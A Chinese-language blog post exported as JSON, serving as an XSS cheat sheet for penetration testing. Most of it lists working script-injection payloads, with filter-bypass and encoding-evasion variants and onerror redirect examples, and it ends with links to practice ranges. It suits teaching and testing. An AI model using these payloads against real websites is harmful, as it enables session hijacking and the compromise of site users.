{"title":"XSSCheatSheet","slug":"XSSCheatSheet","date":"2020-02-22T12:39:37.678Z","updated":"2020-02-22T12:39:18.261Z","comments":true,"path":"api/articles/XSSCheatSheet.json","photos":[],"link":"","excerpt":"XSS检测思路​    a. 利用检测代码可判断哪些字符被转义、过滤等。（可选）​    b. 需要熟悉各种执行JavaScript的payload，以更换测试。​    c. 特殊业务避免使用弹窗测试。","covers":null,"content":"<h4 id=\"XSS检测思路\"><a href=\"#XSS检测思路\" class=\"headerlink\" title=\"XSS检测思路\"></a>XSS检测思路</h4><p>​    a. 利用检测代码可判断哪些字符被转义、过滤等。（可选）</p>\n<p>​    b. 需要熟悉各种执行JavaScript的payload，以更换测试。</p>\n<p>​    c. 特殊业务避免使用弹窗测试。<a id=\"more\"></a></p>\n<p>​    d. xss防护基于黑名单和正则， 绕过基于关键字变形和替换、字符替换、编码、畸形（浏览器自动修复等）。    </p>\n<h5 id=\"1-紧凑的XSS检测代码\"><a href=\"#1-紧凑的XSS检测代码\" class=\"headerlink\" title=\"1.紧凑的XSS检测代码\"></a>1.紧凑的XSS检测代码</h5><p>用于判断哪些字符被转义、过滤。” 闭合属性、&lt;&gt; 闭合标签、&amp;#;字符实体。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">\"'&amp;#; &lt;script&gt;=!--&#123;()&#125;`</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"2-不弹窗测试\"><a href=\"#2-不弹窗测试\" class=\"headerlink\" title=\"2.不弹窗测试\"></a>2.不弹窗测试</h5><p>在console中出现报错信息。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;alert(impossible);&lt;<span class=\"regexp\">/script&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;script&gt;console.error('impossible');&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"3-执行JavaScript\"><a href=\"#3-执行JavaScript\" class=\"headerlink\" title=\"3.执行JavaScript\"></a>3.执行JavaScript</h5><p>基于JavaScript关键字、事件关键字及其html标签。bypass也是围绕关键字、字符的变形。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;scirpt&gt;alert(<span class=\"string\">\"test\"</span>);&lt;<span class=\"regexp\">/script&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;img src=1 onerror=alert(\"test\")&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;svg onload=alert(\"test\");&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;iframe onload=alert(\"test\");&gt;&lt;/i</span>frame&gt;</span><br><span class=\"line\">&lt;a href=<span class=\"string\">\"javascript:alert(`test`);\"</span>&gt;test&lt;<span class=\"regexp\">/a&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;iframe src=javascript:alert('test');&gt;&lt;/i</span>frame&gt;</span><br><span class=\"line\">&lt;input onmouseover=alert(<span class=\"string\">`test`</span>)&gt;</span><br><span class=\"line\">&lt;input onfocus=<span class=\"string\">\"alert('test');\"</span> autofocus&gt; </span><br><span class=\"line\">&lt;details open ontoggle=<span class=\"string\">\"alert('test');\"</span>&gt;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"4-针对关键字的常见bypass\"><a href=\"#4-针对关键字的常见bypass\" class=\"headerlink\" title=\"4.针对关键字的常见bypass\"></a>4.针对关键字的常见bypass</h5><p>大小写绕过：ImG</p>\n<p>双写关键字：imimgg</p>\n<p>利用eval：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=<span class=\"string\">\"x\"</span> onerror=a=<span class=\"string\">`aler`</span>;b=<span class=\"string\">`t`</span>;c=<span class=\"string\">'(`test`);'</span>;<span class=\"built_in\">eval</span>(a+b+c)&gt;</span><br></pre></td></tr></table></figure>\n\n<p>利用top：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;top[<span class=\"string\">\"al\"</span>+<span class=\"string\">\"ert\"</span>](<span class=\"string\">`test`</span>);&lt;<span class=\"regexp\">/script&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>利用%09 (tab)、%0d(\\r)、%0a(\\n)、 &amp;#09;、&NewLine;、 &amp;colon;切割字符</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a href=javascript:alert(<span class=\"number\">1</span>)&gt;test&lt;<span class=\"regexp\">/a&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"5-针对字符的常见bypass\"><a href=\"#5-针对字符的常见bypass\" class=\"headerlink\" title=\"5.针对字符的常见bypass\"></a>5.针对字符的常见bypass</h5><p>过滤双引号：利用浏览器自动修复（自动加引号和闭合标签）</p>\n<p>利用空格分割属性并添加事件（如：value onclick=alert(1) ）</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a href=javascript:alert(<span class=\"regexp\">/test/</span>)&gt;test</span><br></pre></td></tr></table></figure>\n\n<p>使用`引字符串(/可代替空格)</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img/src=<span class=\"regexp\">/ onerror=alert(`test`)&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>过滤了括号</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg/onload=<span class=\"string\">\"window.onerror=eval;throw'=alert\\x281\\x29';\"</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"6-编码绕过\"><a href=\"#6-编码绕过\" class=\"headerlink\" title=\"6.编码绕过\"></a>6.编码绕过</h5><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTML字符实体(html范畴)</span><br><span class=\"line\">&lt;img src=\"x\" onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x74;&amp;#x65;&amp;#x73;&amp;#x74;&amp;#x27;&amp;#x29;&amp;#x3B;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">Unicode(js范畴)</span><br><span class=\"line\">&lt;img src=<span class=\"string\">\"x\"</span> onerror=<span class=\"string\">\"eval('\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0022\\u0074\\u0065\\u0073\\u0074\\u0022\\u0029\\u003b')\"</span>&gt;</span><br><span class=\"line\"> </span><br><span class=\"line\">urlencode</span><br><span class=\"line\">&lt;img src=<span class=\"string\">\"x\"</span> onerror=<span class=\"string\">\"eval(unescape('%61%6C%65%72%74%28%22%74%65%73%74%22%29%3B'))\"</span>&gt;</span><br><span class=\"line\">&lt;iframe src=<span class=\"string\">\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"</span>&gt;&lt;<span class=\"regexp\">/iframe&gt;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">ASCII</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;img src=\"x\" onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,34,116,101,115,116,34,41))\"&gt;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">十六进制(js范畴)</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;img src=x onerror=eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x22\\x74\\x65\\x73\\x74\\x22\\x29')&gt;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">base64</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;img src=\"x\" onerror=\"eval(atob('YWxlcnQoInRlc3QiKQ=='))\"&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;iframe src=\"data:text/</span>html;base64,PHNjcmlwdD5hbGVydCgndGVzdCcpPC9zY3JpcHQ+<span class=\"string\">\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">    </span></span><br><span class=\"line\"><span class=\"string\">dom xss(js范畴)</span></span><br><span class=\"line\"><span class=\"string\">document.write属于js范畴。所有可以输入使用js的编码，document.write输出时会解码一次。</span></span><br><span class=\"line\"><span class=\"string\">\\x3c代表&lt;</span></span><br><span class=\"line\"><span class=\"string\">\\x3e代表&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"7-其它\"><a href=\"#7-其它\" class=\"headerlink\" title=\"7.其它\"></a>7.其它</h5><p>URL</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=<span class=\"string\">\"x\"</span> onerror=<span class=\"built_in\">document</span>.location=<span class=\"string\">`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`</span>&gt;</span><br><span class=\"line\">&lt;img src=<span class=\"string\">\"x\"</span> onerror=<span class=\"built_in\">document</span>.location=<span class=\"string\">`http://2130706433/`</span>&gt; <span class=\"comment\">//使用十进制IP</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"8-靶场通关\"><a href=\"#8-靶场通关\" class=\"headerlink\" title=\"8.靶场通关\"></a>8.靶场通关</h5><p>任何用户输入的地方都可能存在漏洞，追踪输入输出流，包括http请求头各个字段。</p>\n<p><a href=\"http://xss.tesla-space.com/\" target=\"_blank\" rel=\"noopener\">http://xss.tesla-space.com/</a></p>\n<p><a href=\"https://xss-quiz.int21h.jp/\" target=\"_blank\" rel=\"noopener\">https://xss-quiz.int21h.jp/</a></p>\n","categories":[],"tags":[]}